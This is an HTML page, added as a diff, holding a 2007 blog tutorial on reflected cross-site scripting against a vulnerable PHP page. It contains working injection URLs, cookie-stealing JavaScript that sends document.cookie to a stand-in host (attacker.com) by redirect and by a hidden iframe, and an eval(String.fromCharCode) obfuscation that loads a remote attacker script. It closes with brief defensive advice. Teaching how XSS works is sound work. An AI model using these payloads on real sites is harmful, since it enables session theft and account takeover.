@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>XSS Tutorial - Martin Paul Eve</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+<script src="https://kit.fontawesome.com/8417040572.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.min.css">
+<link rel="stylesheet" href="/assets/css/styles.css">
+<link rel="icon" type="image/png" href="/images/favicon.png">
+
+
+<meta name="DC.Identifier.DOI" content="https://doi.org/10.59348/292sw-5rq74"/>
+<meta name="citation_doi" content="https://doi.org/10.59348/292sw-5rq74"/>
+
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org/",
+        "@type": "BlogPosting",
+        "headline": "XSS Tutorial",
+        "author": {
+            "@type": "Person",
+            "name": "Martin Paul Eve"
+        },
+        "datePublished": "2007-05-23 16:11:33 +0100",
+        "dateCreated": "2007-05-23 16:11:33 +0100",
+        "url": "https://eve.gd/2007/05/23/xss-tutorial/",
+        "inLanguage ": "en-GB",
+        "image": "geek.png"
+    }
+</script>
+
+<!-- Open Graph Meta Tags for Social Media Preview -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Tutorial">
+<meta property="og:description" content="This page is designed to give an overview of Cross Site Scripting attacks on web sites, how they come into being, how to exploit them and how to protect agai...">
+
+<meta property="og:image" content="https://eve.gd/images/geek.png">
+
+<meta property="og:url" content="/2007/05/23/xss-tutorial/">
+<meta property="og:site_name" content="Martin Paul Eve">
+<meta property="og:type" content="article" />
+<meta property="og:locale" content="en_GB" />
+<meta property="og:image:type" content="image/png">
+
+<!-- Twitter Card Meta Tags (Optional but Recommended ) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="XSS Tutorial">
+<meta name="twitter:description" content="This page is designed to give an overview of Cross Site Scripting attacks on web sites, how they come into being, how to exploit them and how to protect against them.
+To fully comprehend Cross Site Scripting, or XSS as it is known (CSS is NOT used as an abbreviation because it causes confusion when talking about Cascading Style Sheets), it is necessary to have a basic understanding of (X)HTML, JavaScript and Server Side Scripting. For the purposes of this tutorial the server side scripting language used in examples will be PHP, but this entire document is equally applicable to ASP, JSP and .NET.
+To begin with, consider the following basic PHP page, test.php:
+">
+
+<meta name="twitter:image" content="https://eve.gd/images/geek.png">
+
+
+<meta name="twitter:creator" content="@martin_eve">
+
+<!-- Additional Useful Meta Tags -->
+<meta name="description" content="This page is designed to give an overview of Cross Site Scripting attacks on web sites, how they come into being, how to exploit them and how to protect against them.
+To fully comprehend Cross Site Scripting, or XSS as it is known (CSS is NOT used as an abbreviation because it causes confusion when talking about Cascading Style Sheets), it is necessary to have a basic understanding of (X)HTML, JavaScript and Server Side Scripting. For the purposes of this tutorial the server side scripting language used in examples will be PHP, but this entire document is equally applicable to ASP, JSP and .NET.
+To begin with, consider the following basic PHP page, test.php:
+">
+<meta property="article:published_time" content="2007-05-23 16:11:33 +0100">
+<meta property="article:author" content="Martin Paul Eve">
+
+<link href="https://eve.gd/feed/feed.atom" type="application/atom+xml" rel="alternate" title="Martin Paul Eve Feed">
+
+    <link rel="stylesheet" href="/assets/css/blog-post.css">
+</head>
+<body>
+<!-- Header -->
+<header class="header">
+    <div class="container header-content">
+        <a href="/" class="logo">Martin Paul Eve</a>
+<nav class="nav-desktop">
+    <a href="/" class="nav-link">Home</a>
+    <a href="/about/" class="nav-link">About</a>
+    <a href="/c-v/Eve-CV.pdf" class="nav-link">CV</a>
+    <a href="/posts/" class="nav-link">Web Writings</a>
+    <a href="/books/" class="nav-link">Books</a>
+    <a href="/music/" class="nav-link">Music</a>
+    <a href="mailto:martin@eve.gd" class="btn btn-primary nomob">Contact</a>
+</nav>
+<button class="menu-toggle" aria-label="Toggle menu">
+    <span></span>
+    <span></span>
+    <span></span>
+</button>
+    </div>
+</header>
+
+<main>
+    <!-- Breadcrumb -->
+    <div class="breadcrumb-section">
+        <div class="container">
+            <a href="/">Home</a>
+            <span>/</span>
+            <a href="/posts/">Blog</a>
+            <span>/</span>
+            <span>XSS Tutorial</span>
+        </div>
+    </div>
+
+    <!-- Blog Post Header -->
+    <article class="blog-post">
+        <div class="post-header">
+            <div class="container">
+                <div class="post-meta-top">
+                    <span class="post-date">23 May 2007</span>
+                </div>
+                <h1 class="post-title">XSS Tutorial</h1>
+                <p class="post-description"><strong>Cite as:</strong> Martin Paul Eve, "XSS Tutorial", <i>https://eve.gd</i>, <time itemprop="datePublished dateModified" datetime="May 23, 2007">May 23, 2007</time>, <a href="https://doi.org/10.59348/292sw-5rq74">https://doi.org/10.59348/292sw-5rq74</a>.</p>
+                <div class="post-author">
+                    <img src="/images/mpe.png" alt="Martin Paul Eve" class="author-avatar">
+                    <div class="author-info">
+                        <div class="author-name">Martin Paul Eve</div>
+                        <div class="author-title">Professor of Literature, Technology and Publishing</div>
+                    </div>
+                </div>
+
+                
+
+                
+            </div>
+        </div>
+
+        <!-- Post Content -->
+        <div class="post-content">
+            <div class="container">
+                <div class="post-body">
+                    <p>This page is designed to give an overview of Cross Site Scripting attacks on web sites, how they come into being, how to exploit them and how to protect against them.</p>
+<p>To fully comprehend Cross Site Scripting, or XSS as it is known (CSS is NOT used as an abbreviation because it causes confusion when talking about Cascading Style Sheets), it is necessary to have a basic understanding of (X)HTML, JavaScript and Server Side Scripting. For the purposes of this tutorial the server side scripting language used in examples will be PHP, but this entire document is equally applicable to ASP, JSP and .NET.</p>
+<p>To begin with, consider the following basic PHP page, test.php:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;</span>
+
+<span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">xml:lang=</span><span class="s">"en"</span> <span class="nt">&gt;</span>
+
+	<span class="nt">&lt;head&gt;</span>
+		<span class="nt">&lt;title&gt;</span>XSS Introduction<span class="nt">&lt;/title&gt;</span>
+	<span class="nt">&lt;/head&gt;</span>
+
+	<span class="nt">&lt;body&gt;</span>
+		<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"&lt;?php echo $_GET['linklocation']; ?&gt;"</span><span class="nt">&gt;</span>This is a link<span class="nt">&lt;/a&gt;</span>
+	<span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span></code></pre></figure>
+
+<p>This page takes the url GET parameter "linklocation" and puts it as the href property of the link tag, so visiting test.php?linklocation=test.htm will render the link as:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"test.htm"</span><span class="nt">&gt;</span>This is a link<span class="nt">&lt;/a&gt;</span></code></pre></figure>
+
+<p>So far so good.</p>
+<p>However, this page is vulnerable to a Cross Site Scripting attack because it does not perform sanitization of the input. It is quite clear to a human that the intention of the script is to write the user input into the href attribute of the link tag. However, it is possible with this script to inejct malicious input that will close the href attribute and therefore write the contents of our user input directly into the XHTML document. For an example of this consider the following url:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">test.php?linklocation=test.htm" style=color:red&gt;link1<span class="nt">&lt;/a&gt;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"test2.htm</span></code></pre></figure>
+
+<p>When this url is passed to the above script some interesting things happen. When the first " is encountered the input has succesfully closed the href attribute and is writing directly into the document - in this case adding an additional style attribute to the link and then writing out an entirely new second link tag! The rendered HTML from this injection looks like this:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"test.htm%5C"</span> <span class="na">style=</span><span class="s">"color: red;"</span><span class="nt">&gt;</span>link1<span class="nt">&lt;/a&gt;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"%5C%22test2.htm%22"</span><span class="nt">&gt;</span>This is a link<span class="nt">&lt;/a&gt;</span></code></pre></figure>
+
+<p>But hang on, what are those funny %5C things? These are inserted automatically in PHP's attempt to protect the programmer by a system known as <a href="http://uk3.php.net/magic_quotes">magic_quotes</a> which automatically inserts a \ (backslash) before any type of quote (single or double). This is because, in many circumstances, this will protect you from injection attacks as \" is not normally considered the same as " - except this has no effect on XHTML, so in this instance, magic_quotes is NOT sufficient protection.</p>
+<p>As you can see if you run this example what is actually generated are two hyperlinks, one red and the other plain.</p>
+<p>So what? Why is this useful? Well, firstly it should be fairly obvious that an attacker can easily write their own malicious content into a website in this fashion, but secondly, and more dangerously, they can inject the &lt;script&gt; attribute which enables them to execute code in the context of the victim's browser.</p>
+<p>As an initial proof of concept of this, consider the following url:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">test.php?linklocation=test.htm%22 &gt;who cares<span class="nt">&lt;/a&gt;&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;a</span> <span class="na">href=</span><span class="s">"test.htm</span></code></pre></figure>
+
+<p>which generates:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"test.htm%5C"</span><span class="nt">&gt;</span>who cares<span class="nt">&lt;/a&gt;&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;a</span> <span class="na">href=</span><span class="s">"%5C%22test.htm%22"</span><span class="nt">&gt;</span>This is a link<span class="nt">&lt;/a&gt;</span></code></pre></figure>
+
+<p>Running this url will cause a pop-up dialog to appear with "1" as its text. However, now we can inject any JavaScript, there is far more potential for danger than just popping up dialog boxes. The document.cookie property contains all the cookie data for a site, data which, if transmitted to an attacker, will theoretically allow them to impersonate the victim's login details.</p>
+<p>There are two main ways to transmit cookie data from the victim to the attacker by JavaScript. The first is very unsubtle and involves the JavaScript code:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">document.location = 'http://www.attacker.com/stealer.php?cookie=' + document.cookie;</code></pre></figure>
+
+<p>This method is unsubtle to say the least. The victim will be redirected to the attacker's site and will see that their cookies have been transmitted. Those with basic JavaScript understanding might at this point wonder "why not transmit the cookies by AJAX?" The reason for this is that XMLHttpRequest (the mechanism behind AJAX) is limited to transmitting requests to the same domain - in other words www.victim.com (where the JavaScript is "hosted") cannot send an AJAX request to www.attacker.com. So, what can be done to silently obtain a user's cookies? The answer lies in the iframe tag using the following JavaScript code which has only been tested in FireFox:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript">	<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://www.attacker.com/stealer.php</span><span class="dl">"</span><span class="p">;</span>
+
+	<span class="nx">url</span> <span class="o">=</span> <span class="nx">url</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">?cookie=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+
+	<span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">body</span><span class="dl">'</span><span class="p">).</span><span class="nf">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+	<span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
+	<span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
+	<span class="nx">iframe</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">style</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">display:none;</span><span class="dl">"</span><span class="p">);</span>
+	<span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span></code></pre></figure>
+
+<p>This code creates an invisible iframe at the bottom of the page's <body> tag that silently loads attacker.com/stealer.php and sends the cookies.&lt;/p&gt;
+<p>The attentive reader may at this point be wondering how this is of any use to us, after all I stated earlier that magic_quotes will encapsulate any "s and 's as \" and \' respectively - something that JavaScript is not going to be happy with and also that, with all that code, it's going to be one lengthy URL! The simple answer is that this can be overcome by loading an external script into the document. Again, were magic_quotes disabled we could use the handy document.write("&lt;script etc.") but, alas, the "s are converted into \". So, how can we bypass this? Well, the first way is by encoding the input. JavaScript has a function named eval() which will execute any JavaScript passed to it as a string. There is also a static member of the String object called .fromCharCode which will create a string from ascii characters passed to it. You can encode your own JavaScript using my <a href="http://www.martineve.com/2007/05/23/string-fromcharcode-encoder/">encoding tool</a>. So,</p>
+
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;script src="http://www.attacker.com/remote.js" /&gt;</span><span class="dl">'</span><span class="p">)</span></code></pre></figure>
+
+
+<p>becomes</p>
+
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nf">eval</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">117</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span>
+<span class="mi">99</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">107</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span>
+<span class="mi">106</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">41</span><span class="p">))</span></code></pre></figure>
+
+
+<p>which contains no nasty input for magic_quotes to try and filter. Visiting this url</p>
+
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">test</span><span class="p">.</span><span class="nx">php</span><span class="p">?</span><span class="nx">linklocation</span><span class="o">=</span><span class="nx">test</span><span class="p">.</span><span class="nx">htm</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">Etest</span><span class="o">%</span><span class="mi">3</span><span class="nx">C</span><span class="o">/</span><span class="nx">a</span><span class="o">%</span><span class="mi">3</span><span class="nx">E</span><span class="o">%</span><span class="mi">3</span><span class="nx">Cscript</span><span class="o">%</span><span class="mi">3</span><span class="nx">E</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">20</span><span class="nf">eval</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span>
+<span class="mi">117</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span>
+<span class="mi">119</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">107</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">41</span><span class="p">))</span><span class="o">%</span><span class="mi">3</span><span class="nx">C</span><span class="o">/</span><span class="nx">script</span><span class="o">%</span><span class="mi">3</span><span class="nx">E</span><span class="o">%</span><span class="mi">3</span><span class="nx">Ca</span><span class="o">%</span><span class="mi">20</span><span class="nx">href</span><span class="o">=%</span><span class="mi">22</span><span class="nx">test1</span><span class="p">.</span><span class="nx">htm</span></code></pre></figure>
+
+
+<p>results in the following in-browser render:</p>
+
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://www.attacker.com/remote.js"</span><span class="nt">&gt;&lt;/script&gt;</span></code></pre></figure>
+
+
+<p>So now it is possible to load a remote script into the victim's browser and the attacker is free from complex encodings using fromCharCode and the such like. It is worth mentioning at this stage that this is by no means the only way to inject a remote script into the page and that my preferred method is XBL injection by using the -moz-binding value of the style attribute - but that's another story.</p>
+<p>I want to use the closing lines of this section on exploiting XSS to point out that stealing cookies is NOT the only action that can be taken. Now that the attacker has injected a full length JavaScript document into the host it is possible to take almost any action that the user would (the exception being to upload files) including submitting forms, resetting passwords/emails - you name it, it's doable.</p>
+<p>So, how can XSS attacks be prevented? It is important to sanitize input on both the inward and outward phases of processing - if data comes in (eg. from a cookie) - treat it as malicious and DO NOT put any of its data onto a page until it has been sanitized. Furthermore, if you are using PHP check out the <a href="http://groups.google.de/group/php-ids">PHP IDS</a>, a project to detect malicious input.</p>
+<p>For a list of common XSS attack vectors, check out <a href="http://ha.ckers.org/xss.html">Rsnake's XSS Cheat Sheet</a>.</p>
+
+
+
+
+
+</body></p>
+
+                    
+                </div>
+
+                <!-- Post Sidebar -->
+                <aside class="post-sidebar">
+                    <div class="sidebar-widget">
+                        <h3>Share This Post</h3>
+                        <div class="share-buttons">
+                            <a href="https://bsky.app/intent/compose?text=XSS+Tutorial+https://eve.gd/2007/05/23/xss-tutorial/" class="share-btn share-bluesky" title="Share on Bluesky">
+                                <i class="fa-brands fa-square-bluesky" aria-hidden="true"></i>
+                            </a>
+                            <a href="https://www.facebook.com/sharer/sharer.php?u=https://eve.gd/2007/05/23/xss-tutorial/" class="share-btn share-facebook" title="Share on LinkedIn">
+                                <i class="fa-brands fa-square-facebook" aria-hidden="true"></i>
+                            </a>
+
+                        </div>
+                    </div>
+
+                    <div class="sidebar-widget">
+                        <h3>Related Posts</h3>
+                        <ul class="related-posts">
+                            
+                            <li>
+                                <a href="/2026/06/03/what-is-actually-licensed-in-printdigital-dual-licensed-books/" title="What is actually licensed in print/digital dual-licensed books?">What is actually licensed in print/digital dual-licensed books?</a>
+                                <span class="related-date">3 June 2026</span>
+                            </li>
+                            
+                            <li>
+                                <a href="/2026/05/21/things-i-have-made-lower-decks-conference-and-quote-in-researchprofessional/" title="Things I have made (KC IDMS in place, Lower Decks conference, and quote in ResearchProfessional)">Things I have made (KC IDMS in place, Lower Decks conference, and quote in ResearchProfessional)</a>
+                                <span class="related-date">21 May 2026</span>
+                            </li>
+                            
+                            <li>
+                                <a href="/2026/04/19/the-necessary-pain-involved-in-blogging-if-you-want-your-work-to-be-preserved-beyond-your-lifespan/" title="The Necessary Pain Involved in Blogging (if you want your work to be preserved beyond your lifespan)">The Necessary Pain Involved in Blogging (if you want your work to be preserved beyond your lifespan)</a>
+                                <span class="related-date">19 April 2026</span>
+                            </li>
+                            
+                        </ul>
+                    </div>
+                </aside>
+            </div>
+        </div>
+    </article>
+</main>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="container">
+    <div class="footer-grid">
+        <div class="footer-section footer-about">
+            <h3>Martin Paul Eve</h3>
+            <p>Professor of Literature, Technology and Publishing at Birkbeck, University of London. Technical Lead of Knowledge Commons at MESH Research, Michigan State University.</p>
+            <div class="social-links">
+                <a href="https://bsky.app/profile/eve.gd" aria-label="Bluesky" class="social-icon">
+                    <i class="fa-brands fa-square-bluesky" aria-hidden="true"></i>
+                </a>
+                <a href="https://github.com/MartinPaulEve" aria-label="GitHub" class="social-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v 3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path>
+                    </svg>
+                </a>
+                <a aria-label="Wikipedia" class="social-icon" href="https://en.wikipedia.org/wiki/Martin_Paul_Eve"><i class="fab fa-fw fa-wikipedia-w" aria-hidden="true"></i></a>
+            </div>
+            <div class="social-links row-two">
+                <a href="https://orcid.org/0000-0002-5589-8511" aria-label="ORCID" class="social-icon">
+                    <img src="/images/orcid.png" alt="ORCID ID">
+                </a>
+                <a href="/pictures/" aria-label="Pictures for Re-Use" class="social-icon">
+                    <i class="fas fa-fw fa-images" aria-hidden="true"></i>
+                </a>
+                <a href="https://works.hcommons.org/search?q=metadata.creators.person_or_org.name%3A%22Eve%2C%20Martin%20Paul%22&amp;l=list&amp;p=1&amp;s=10&amp;sort=bestmatch" class="social-icon">
+                    <i class="fa fa-fw fa-university" aria-hidden="true"></i>
+                </a>
+                <a href="http://eprints.bbk.ac.uk/view/people/Eve=3AMartin_Paul=3A=3A.html" class="social-icon"><i class="fa fa-fw fa-file-text" aria-hidden="true"></i></a>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <h4>Quick Links</h4>
+            <ul>
+                <li><a href="/about/">About Me</a></li>
+                <li><a href="/c-v/Eve-CV.pdf">Curriculum Vitae</a></li>
+                <li><a href="/posts/">Web Writings</a></li>
+                <li><a href="/books/">Books</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-section">
+            <h4>Contact</h4>
+            <ul>
+                <li><a href="mailto:martin@eve.gd">Personal Email</a></li>
+                <li><a href="mailto:martin.eve@bbk.ac.uk">Birkbeck, University of London</a></li>
+                <li><a href="mailto:eve@msu.edu">Michigan State University</a></li>
+                <li><a href="mailto:martin.paul_eve@kcl.ac.uk">King's College London</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <p>© 2025 Martin Paul Eve. CC BY 4.0 License.</p>
+        <div class="footer-links">
+        </div>
+    </div>
+</div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+    // Initialize syntax highlighting
+    document.querySelectorAll('pre code').forEach((block) => {
+        hljs.highlightElement(block);
+    });
+</script>
+<script src="/assets/js/script.js"></script>
+</body>
+</html>
